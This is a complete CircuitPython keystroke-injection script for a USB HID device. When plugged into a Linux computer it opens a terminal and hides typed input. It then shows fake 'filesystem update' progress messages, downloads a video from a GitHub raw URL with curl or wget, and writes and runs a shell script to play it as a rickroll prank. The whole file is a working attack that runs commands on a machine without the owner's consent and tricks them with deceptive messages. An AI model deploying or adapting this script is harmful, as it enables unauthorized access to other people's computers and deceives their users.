# Made by ARandomGuy2304
# Do not use this code for illegal purposes.
# If you add this code to a repository or edit it, always keep this comments.
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)
time.sleep(2)
keyboard.send(Keycode.CONTROL, Keycode.ALT, Keycode.T)
time.sleep(2)
layout.write("setxkbmap us\n")
time.sleep(0.2)
layout.write("stty -echo\n")
time.sleep(0.2)
layout.write("clear\n")
time.sleep(0.2)
layout.write("echo \"Your filesystem needs to be updated.\" \n")
time.sleep(2)
layout.write("echo \"Please do not press any keys, even if the Terminal closes. After this computer will be rebooted, you may use it normally again.\" \n")
time.sleep(0.1)
layout.write(
"FILE=/tmp/rickroll.mp4; "
"URL=https://raw.githubusercontent.com/ARandomGuy2304/lib/main/rickroll.mp4;"
"if [ ! -f \"$FILE\" ]; then "
"if command -v curl >/dev/null 2>&1; then "
"curl -sL \"$URL\" -o \"$FILE\"; "
"elif command -v wget >/dev/null 2>&1; then "
"wget -qO \"$FILE\" \"$URL\"; "
"else echo \"no downloader\"; exit 1; fi; "
"fi\n")
time.sleep(10)
layout.write("echo \"Updating filesystem (1% complete)...\" \n")
time.sleep(1)
layout.write("echo \"Updating filesystem (4% complete)...\" \n")
time.sleep(3)
layout.write("echo \"Updating filesystem (17% complete)...\" \n")
time.sleep(7)
layout.write("echo \"Updating filesystem (45% complete)...\" \n")
time.sleep(0.3)
layout.write("echo \"Updating filesystem (58% complete)...\" \n")
time.sleep(4.7)
layout.write("echo \"Updating filesystem (81% complete)...\" \n")
time.sleep(0.2)
layout.write("echo \"Finalizing...\" \n")
time.sleep(2)
layout.write("cat << EOF > cache-cleaner.sh\n")
time.sleep(0.05)
layout.write("#!/bin/bash\n")
time.sleep(0.05)
layout.write("FILE=/tmp/rickroll.mp4\n")
time.sleep(0.05)
layout.write("xdg-open \"$FILE\" && exit\n")
time.sleep(0.05)
layout.write("EOF\n")
time.sleep(0.05)
layout.write("( sleep 7 && gnome-terminal -- bash -c \"bash cache-cleaner.sh && exit\" ) & exit\n")
time.sleep(7)
time.sleep(0.7)
layout.write("f\n")
